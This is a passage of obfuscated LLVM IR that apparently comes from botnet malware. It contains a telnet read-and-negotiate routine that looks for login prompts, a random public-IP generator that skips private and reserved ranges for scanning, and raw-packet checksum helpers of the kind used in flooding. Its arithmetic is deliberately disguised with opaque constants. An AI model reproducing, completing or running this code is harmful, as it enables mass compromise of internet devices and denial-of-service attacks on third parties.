  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %119

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %83, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %81

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, %28
  %30 = add i64 0, %29
  %31 = sub i64 0, %28
  %32 = getelementptr inbounds i8, i8* %26, i64 %30
  %33 = load i8, i8* %32, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %34, 0
  br i1 %35, label %79, label %36

; <label>:36:                                     ; preds = %22
  %37 = load i8*, i8** %3, align 8
  %38 = load i32, i32* %5, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds i8, i8* %37, i64 %39
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = add i64 0, 6986199035999658299
  %44 = sub i64 %43, %42
  %45 = sub i64 %44, 6986199035999658299
  %46 = sub i64 0, %42
  %47 = getelementptr inbounds i8, i8* %40, i64 %45
  %48 = load i8, i8* %47, align 1
  %49 = sext i8 %48 to i32
  %50 = icmp eq i32 %49, 32
  br i1 %50, label %79, label %51

; <label>:51:                                     ; preds = %36
  %52 = load i8*, i8** %3, align 8
  %53 = load i32, i32* %5, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = load i32, i32* %7, align 4
  %57 = sext i32 %56 to i64
  %58 = sub i64 0, %57
  %59 = add i64 0, %58
  %60 = sub i64 0, %57
  %61 = getelementptr inbounds i8, i8* %55, i64 %59
  %62 = load i8, i8* %61, align 1
  %63 = sext i8 %62 to i32
  %64 = icmp eq i32 %63, 13
  br i1 %64, label %79, label %65

; <label>:65:                                     ; preds = %51
  %66 = load i8*, i8** %3, align 8
  %67 = load i32, i32* %5, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i8, i8* %66, i64 %68
  %70 = load i32, i32* %7, align 4
  %71 = sext i32 %70 to i64
  %72 = sub i64 0, %71
  %73 = add i64 0, %72
  %74 = sub i64 0, %71
  %75 = getelementptr inbounds i8, i8* %69, i64 %73
  %76 = load i8, i8* %75, align 1
  %77 = sext i8 %76 to i32
  %78 = icmp eq i32 %77, 10
  br label %79

; <label>:79:                                     ; preds = %65, %51, %36, %22
  %80 = phi i1 [ true, %51 ], [ true, %36 ], [ true, %22 ], [ %78, %65 ]
  br label %81

; <label>:81:                                     ; preds = %79, %18
  %82 = phi i1 [ false, %18 ], [ %80, %79 ]
  br i1 %82, label %83, label %89

; <label>:83:                                     ; preds = %81
  %84 = load i32, i32* %7, align 4
  %85 = sub i32 %84, 989069401
  %86 = add i32 %85, 1
  %87 = add i32 %86, 989069401
  %88 = add nsw i32 %84, 1
  store i32 %87, i32* %7, align 4
  br label %18

; <label>:89:                                     ; preds = %81
  %90 = load i8*, i8** %3, align 8
  %91 = load i32, i32* %5, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i8, i8* %90, i64 %92
  %94 = load i32, i32* %7, align 4
  %95 = sext i32 %94 to i64
  %96 = add i64 0, -9142264916997198688
  %97 = sub i64 %96, %95
  %98 = sub i64 %97, -9142264916997198688
  %99 = sub i64 0, %95
  %100 = getelementptr inbounds i8, i8* %93, i64 %98
  %101 = load i8, i8* %100, align 1
  %102 = sext i8 %101 to i32
  %103 = load i8*, i8** %4, align 8
  %104 = load i32, i32* %6, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8, i8* %103, i64 %105
  %107 = load i8, i8* %106, align 1
  %108 = sext i8 %107 to i32
  %109 = icmp eq i32 %102, %108
  br i1 %109, label %110, label %111

; <label>:110:                                    ; preds = %89
  store i32 1, i32* %2, align 4
  br label %120

; <label>:111:                                    ; preds = %89
  br label %112

; <label>:112:                                    ; preds = %111
  %113 = load i32, i32* %6, align 4
  %114 = sub i32 0, %113
  %115 = sub i32 0, 1
  %116 = add i32 %114, %115
  %117 = sub i32 0, %116
  %118 = add nsw i32 %113, 1
  store i32 %117, i32* %6, align 4
  br label %11

; <label>:119:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %120

; <label>:120:                                    ; preds = %119, %110
  %121 = load i32, i32* %2, align 4
  ret i32 %121
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %152, %8
  %34 = load i32, i32* %18, align 4
  %35 = sub i32 0, %34
  %36 = sub i32 0, 2
  %37 = add i32 %35, %36
  %38 = sub i32 0, %37
  %39 = add nsw i32 %34, 2
  %40 = load i32, i32* %16, align 4
  %41 = icmp slt i32 %38, %40
  br i1 %41, label %42, label %52

; <label>:42:                                     ; preds = %33
  %43 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %44 = load i64, i64* %43, align 8
  %45 = icmp sgt i64 %44, 0
  br i1 %45, label %50, label %46

; <label>:46:                                     ; preds = %42
  %47 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %48 = load i64, i64* %47, align 8
  %49 = icmp sgt i64 %48, 0
  br label %50

; <label>:50:                                     ; preds = %46, %42
  %51 = phi i1 [ true, %42 ], [ %49, %46 ]
  br label %52

; <label>:52:                                     ; preds = %50, %33
  %53 = phi i1 [ false, %33 ], [ %51, %50 ]
  br i1 %53, label %54, label %153

; <label>:54:                                     ; preds = %52
  br label %55

; <label>:55:                                     ; preds = %54
  %56 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %57 = getelementptr inbounds [16 x i64], [16 x i64]* %56, i64 0, i64 0
  %58 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %57) #4, !srcloc !4
  %59 = extractvalue { i64, i64* } %58, 0
  %60 = extractvalue { i64, i64* } %58, 1
  %61 = trunc i64 %59 to i32
  store i32 %61, i32* %24, align 4
  %62 = ptrtoint i64* %60 to i64
  %63 = trunc i64 %62 to i32
  store i32 %63, i32* %25, align 4
  br label %64

; <label>:64:                                     ; preds = %55
  %65 = load i32, i32* %10, align 4
  %66 = srem i32 %65, 64
  %67 = zext i32 %66 to i64
  %68 = shl i64 1, %67
  %69 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %70 = load i32, i32* %10, align 4
  %71 = sdiv i32 %70, 64
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds [16 x i64], [16 x i64]* %69, i64 0, i64 %72
  %74 = load i64, i64* %73, align 8
  %75 = and i64 %74, %68
  %76 = xor i64 %74, %68
  %77 = or i64 %75, %76
  %78 = or i64 %74, %68
  store i64 %77, i64* %73, align 8
  %79 = load i32, i32* %10, align 4
  %80 = add i32 %79, 22062874
  %81 = add i32 %80, 1
  %82 = sub i32 %81, 22062874
  %83 = add nsw i32 %79, 1
  %84 = call i32 @select(i32 %82, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %85 = icmp slt i32 %84, 1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %64
  br label %153

; <label>:87:                                     ; preds = %64
  %88 = load i8*, i8** %15, align 8
  %89 = load i32, i32* %18, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8, i8* %88, i64 %90
  store i8* %91, i8** %23, align 8
  %92 = load i32, i32* %10, align 4
  %93 = load i8*, i8** %23, align 8
  %94 = call i64 @recv(i32 %92, i8* %93, i64 1, i32 0)
  %95 = trunc i64 %94 to i32
  store i32 %95, i32* %19, align 4
  %96 = load i32, i32* %19, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %101, label %98

; <label>:98:                                     ; preds = %87
  %99 = load i32, i32* %19, align 4
  %100 = icmp eq i32 %99, 0
  br i1 %100, label %101, label %102

; <label>:101:                                    ; preds = %98, %87
  store i32 0, i32* %9, align 4
  br label %158

; <label>:102:                                    ; preds = %98
  %103 = load i32, i32* %19, align 4
  %104 = load i32, i32* %18, align 4
  %105 = sub i32 %104, 519600008
  %106 = add i32 %105, %103
  %107 = add i32 %106, 519600008
  %108 = add nsw i32 %104, %103
  store i32 %107, i32* %18, align 4
  %109 = load i8*, i8** %23, align 8
  %110 = load i8, i8* %109, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 255
  br i1 %112, label %113, label %138

; <label>:113:                                    ; preds = %102
  %114 = load i32, i32* %10, align 4
  %115 = load i8*, i8** %23, align 8
  %116 = getelementptr inbounds i8, i8* %115, i64 1
  %117 = call i64 @recv(i32 %114, i8* %116, i64 2, i32 0)
  %118 = trunc i64 %117 to i32
  store i32 %118, i32* %19, align 4
  %119 = load i32, i32* %19, align 4
  %120 = icmp eq i32 %119, -1
  br i1 %120, label %124, label %121

; <label>:121:                                    ; preds = %113
  %122 = load i32, i32* %19, align 4
  %123 = icmp eq i32 %122, 0
  br i1 %123, label %124, label %125

; <label>:124:                                    ; preds = %121, %113
  store i32 0, i32* %9, align 4
  br label %158

; <label>:125:                                    ; preds = %121
  %126 = load i32, i32* %19, align 4
  %127 = load i32, i32* %18, align 4
  %128 = add i32 %127, 18665332
  %129 = add i32 %128, %126
  %130 = sub i32 %129, 18665332
  %131 = add nsw i32 %127, %126
  store i32 %130, i32* %18, align 4
  %132 = load i32, i32* %10, align 4
  %133 = load i8*, i8** %23, align 8
  %134 = call i32 @negotiate(i32 %132, i8* %133, i32 3)
  %135 = icmp ne i32 %134, 0
  br i1 %135, label %137, label %136

; <label>:136:                                    ; preds = %125
  store i32 0, i32* %9, align 4
  br label %158

; <label>:137:                                    ; preds = %125
  br label %152

; <label>:138:                                    ; preds = %102
  %139 = load i8*, i8** %15, align 8
  %140 = load i8*, i8** %11, align 8
  %141 = call i8* @strstr(i8* %139, i8* %140) #10
  %142 = icmp ne i8* %141, null
  br i1 %142, label %150, label %143

; <label>:143:                                    ; preds = %138
  %144 = load i32, i32* %12, align 4
  %145 = icmp ne i32 %144, 0
  br i1 %145, label %146, label %151

; <label>:146:                                    ; preds = %143
  %147 = load i8*, i8** %15, align 8
  %148 = call i32 @matchPrompt(i8* %147)
  %149 = icmp ne i32 %148, 0
  br i1 %149, label %150, label %151

; <label>:150:                                    ; preds = %146, %138
  store i32 1, i32* %20, align 4
  br label %153

; <label>:151:                                    ; preds = %146, %143
  br label %152

; <label>:152:                                    ; preds = %151, %137
  br label %33

; <label>:153:                                    ; preds = %150, %86, %52
  %154 = load i32, i32* %20, align 4
  %155 = icmp ne i32 %154, 0
  br i1 %155, label %156, label %157

; <label>:156:                                    ; preds = %153
  store i32 1, i32* %9, align 4
  br label %158

; <label>:157:                                    ; preds = %153
  store i32 0, i32* %9, align 4
  br label %158

; <label>:158:                                    ; preds = %157, %156, %136, %124, %101
  %159 = load i32, i32* %9, align 4
  ret i32 %159
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  %3 = alloca [16 x i8], align 16
  %4 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %5 = zext i8 %4 to i32
  %6 = icmp sgt i32 %5, 0
  br i1 %6, label %7, label %31

; <label>:7:                                      ; preds = %0
  %8 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %9 = zext i8 %8 to i32
  %10 = icmp slt i32 %9, 255
  br i1 %10, label %11, label %31

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %13 = sub i8 0, %12
  %14 = sub i8 0, 1
  %15 = add i8 %13, %14
  %16 = sub i8 0, %15
  %17 = add i8 %12, 1
  store i8 %16, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %18 = bitcast [16 x i8]* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 16, i1 false)
  %19 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %20 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %21 = zext i8 %20 to i32
  %22 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %25 = zext i8 %24 to i32
  %26 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %27 = zext i8 %26 to i32
  %28 = call i32 (i8*, i8*, ...) @szprintf(i8* %19, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.24, i32 0, i32 0), i32 %21, i32 %23, i32 %25, i32 %27)
  %29 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %30 = call i32 @inet_addr(i8* %29) #4
  store i32 %30, i32* %1, align 4
  br label %181

; <label>:31:                                     ; preds = %7, %0
  %32 = call i32 @rand() #4
  %33 = srem i32 %32, 255
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %35 = call i32 @rand() #4
  %36 = srem i32 %35, 255
  %37 = trunc i32 %36 to i8
  store i8 %37, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %38 = call i32 @rand() #4
  %39 = srem i32 %38, 255
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  br label %41

; <label>:41:                                     ; preds = %159, %31
  %42 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 0
  br i1 %44, label %157, label %45

; <label>:45:                                     ; preds = %41
  %46 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %47 = zext i8 %46 to i32
  %48 = icmp eq i32 %47, 10
  br i1 %48, label %157, label %49

; <label>:49:                                     ; preds = %45
  %50 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 100
  br i1 %52, label %53, label %61

; <label>:53:                                     ; preds = %49
  %54 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %55 = zext i8 %54 to i32
  %56 = icmp sge i32 %55, 64
  br i1 %56, label %57, label %61

; <label>:57:                                     ; preds = %53
  %58 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %59 = zext i8 %58 to i32
  %60 = icmp sle i32 %59, 127
  br i1 %60, label %157, label %61

; <label>:61:                                     ; preds = %57, %53, %49
  %62 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %63 = zext i8 %62 to i32
  %64 = icmp eq i32 %63, 127
  br i1 %64, label %157, label %65

; <label>:65:                                     ; preds = %61
  %66 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %67 = zext i8 %66 to i32
  %68 = icmp eq i32 %67, 169
  br i1 %68, label %69, label %73

; <label>:69:                                     ; preds = %65
  %70 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %71 = zext i8 %70 to i32
  %72 = icmp eq i32 %71, 254
  br i1 %72, label %157, label %73

; <label>:73:                                     ; preds = %69, %65
  %74 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %75 = zext i8 %74 to i32
  %76 = icmp eq i32 %75, 172
  br i1 %76, label %77, label %85

; <label>:77:                                     ; preds = %73
  %78 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %79 = zext i8 %78 to i32
  %80 = icmp sle i32 %79, 16
  br i1 %80, label %81, label %85

; <label>:81:                                     ; preds = %77
  %82 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %83 = zext i8 %82 to i32
  %84 = icmp sle i32 %83, 31
  br i1 %84, label %157, label %85

; <label>:85:                                     ; preds = %81, %77, %73
  %86 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %87 = zext i8 %86 to i32
  %88 = icmp eq i32 %87, 192
  br i1 %88, label %89, label %97

; <label>:89:                                     ; preds = %85
  %90 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %91 = zext i8 %90 to i32
  %92 = icmp eq i32 %91, 0
  br i1 %92, label %93, label %97

; <label>:93:                                     ; preds = %89
  %94 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %95 = zext i8 %94 to i32
  %96 = icmp eq i32 %95, 2
  br i1 %96, label %157, label %97

; <label>:97:                                     ; preds = %93, %89, %85
  %98 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %99 = zext i8 %98 to i32
  %100 = icmp eq i32 %99, 192
  br i1 %100, label %101, label %109

; <label>:101:                                    ; preds = %97
  %102 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 88
  br i1 %104, label %105, label %109

; <label>:105:                                    ; preds = %101
  %106 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %107 = zext i8 %106 to i32
  %108 = icmp eq i32 %107, 99
  br i1 %108, label %157, label %109

; <label>:109:                                    ; preds = %105, %101, %97
  %110 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 192
  br i1 %112, label %113, label %117

; <label>:113:                                    ; preds = %109
  %114 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %115 = zext i8 %114 to i32
  %116 = icmp eq i32 %115, 168
  br i1 %116, label %157, label %117

; <label>:117:                                    ; preds = %113, %109
  %118 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %119 = zext i8 %118 to i32
  %120 = icmp eq i32 %119, 198
  br i1 %120, label %121, label %129

; <label>:121:                                    ; preds = %117
  %122 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %123 = zext i8 %122 to i32
  %124 = icmp eq i32 %123, 18
  br i1 %124, label %157, label %125

; <label>:125:                                    ; preds = %121
  %126 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %127 = zext i8 %126 to i32
  %128 = icmp eq i32 %127, 19
  br i1 %128, label %157, label %129

; <label>:129:                                    ; preds = %125, %117
  %130 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 198
  br i1 %132, label %133, label %141

; <label>:133:                                    ; preds = %129
  %134 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %135 = zext i8 %134 to i32
  %136 = icmp eq i32 %135, 51
  br i1 %136, label %137, label %141

; <label>:137:                                    ; preds = %133
  %138 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %139 = zext i8 %138 to i32
  %140 = icmp eq i32 %139, 100
  br i1 %140, label %157, label %141

; <label>:141:                                    ; preds = %137, %133, %129
  %142 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %143 = zext i8 %142 to i32
  %144 = icmp eq i32 %143, 203
  br i1 %144, label %145, label %153

; <label>:145:                                    ; preds = %141
  %146 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %147 = zext i8 %146 to i32
  %148 = icmp eq i32 %147, 0
  br i1 %148, label %149, label %153

; <label>:149:                                    ; preds = %145
  %150 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 113
  br i1 %152, label %157, label %153

; <label>:153:                                    ; preds = %149, %145, %141
  %154 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %155 = zext i8 %154 to i32
  %156 = icmp sge i32 %155, 224
  br label %157

; <label>:157:                                    ; preds = %153, %149, %137, %125, %121, %113, %105, %93, %81, %69, %61, %57, %45, %41
  %158 = phi i1 [ true, %149 ], [ true, %137 ], [ true, %125 ], [ true, %121 ], [ true, %113 ], [ true, %105 ], [ true, %93 ], [ true, %81 ], [ true, %69 ], [ true, %61 ], [ true, %57 ], [ true, %45 ], [ true, %41 ], [ %156, %153 ]
  br i1 %158, label %159, label %169

; <label>:159:                                    ; preds = %157
  %160 = call i32 @rand() #4
  %161 = srem i32 %160, 255
  %162 = trunc i32 %161 to i8
  store i8 %162, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %163 = call i32 @rand() #4
  %164 = srem i32 %163, 255
  %165 = trunc i32 %164 to i8
  store i8 %165, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %166 = call i32 @rand() #4
  %167 = srem i32 %166, 255
  %168 = trunc i32 %167 to i8
  store i8 %168, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  br label %41

; <label>:169:                                    ; preds = %157
  %170 = bitcast [16 x i8]* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %170, i8 0, i64 16, i32 16, i1 false)
  %171 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %172 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %173 = zext i8 %172 to i32
  %174 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %175 = zext i8 %174 to i32
  %176 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %177 = zext i8 %176 to i32
  %178 = call i32 (i8*, i8*, ...) @szprintf(i8* %171, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.25, i32 0, i32 0), i32 %173, i32 %175, i32 %177)
  %179 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %180 = call i32 @inet_addr(i8* %179) #4
  store i32 %180, i32* %1, align 4
  br label %181

; <label>:181:                                    ; preds = %169, %11
  %182 = load i32, i32* %1, align 4
  ret i32 %182
}

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = xor i32 %6, -1
  %8 = xor i32 %5, %7
  %9 = and i32 %8, %5
  %10 = and i32 %5, %6
  store i32 %9, i32* %3, align 4
  %11 = load i32, i32* %3, align 4
  %12 = call i32 @rand_cmwc()
  %13 = load i32, i32* %2, align 4
  %14 = xor i32 %13, -1
  %15 = and i32 -939561205, %14
  %16 = xor i32 -939561205, -1
  %17 = and i32 %13, %16
  %18 = xor i32 -1, -1
  %19 = and i32 %18, -939561205
  %20 = and i32 -1, %16
  %21 = or i32 %15, %17
  %22 = or i32 %19, %20
  %23 = xor i32 %21, %22
  %24 = xor i32 %13, -1
  %25 = xor i32 %23, -1
  %26 = xor i32 %12, %25
  %27 = and i32 %26, %12
  %28 = and i32 %12, %23
  %29 = xor i32 %11, -1
  %30 = and i32 -1918477387, %29
  %31 = xor i32 -1918477387, -1
  %32 = and i32 %11, %31
  %33 = xor i32 %27, -1
  %34 = and i32 %33, -1918477387
  %35 = and i32 %27, %31
  %36 = or i32 %30, %32
  %37 = or i32 %34, %35
  %38 = xor i32 %36, %37
  %39 = xor i32 %11, %27
  ret i32 %38
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %24

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, -5849684540382429129
  %16 = add i64 %15, %13
  %17 = sub i64 %16, -5849684540382429129
  %18 = add i64 %14, %13
  store i64 %17, i64* %5, align 8
  %19 = load i32, i32* %4, align 4
  %20 = sub i32 %19, 1469530571
  %21 = sub i32 %20, 2
  %22 = add i32 %21, 1469530571
  %23 = sub nsw i32 %19, 2
  store i32 %22, i32* %4, align 4
  br label %6

; <label>:24:                                     ; preds = %6
  %25 = load i32, i32* %4, align 4
  %26 = icmp sgt i32 %25, 0
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %24
  %28 = load i16*, i16** %3, align 8
  %29 = bitcast i16* %28 to i8*
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i64
  %32 = load i64, i64* %5, align 8
  %33 = sub i64 0, %31
  %34 = sub i64 %32, %33
  %35 = add i64 %32, %31
  store i64 %34, i64* %5, align 8
  br label %36

; <label>:36:                                     ; preds = %27, %24
  br label %37

; <label>:37:                                     ; preds = %41, %36
  %38 = load i64, i64* %5, align 8
  %39 = lshr i64 %38, 16
  %40 = icmp ne i64 %39, 0
  br i1 %40, label %41, label %56

; <label>:41:                                     ; preds = %37
  %42 = load i64, i64* %5, align 8
  %43 = xor i64 %42, -1
  %44 = xor i64 65535, -1
  %45 = xor i64 -6203784703343837518, -1
  %46 = or i64 %43, %44
  %47 = or i64 -6203784703343837518, %45
  %48 = xor i64 %46, -1
  %49 = and i64 %48, %47
  %50 = and i64 %42, 65535
  %51 = load i64, i64* %5, align 8
  %52 = lshr i64 %51, 16
  %53 = sub i64 0, %52
  %54 = sub i64 %49, %53
  %55 = add i64 %49, %52
  store i64 %54, i64* %5, align 8
  br label %37

; <label>:56:                                     ; preds = %37
  %57 = load i64, i64* %5, align 8
  %58 = xor i64 %57, -1
  %59 = and i64 -3389379937886822560, %58
  %60 = xor i64 -3389379937886822560, -1
  %61 = and i64 %57, %60
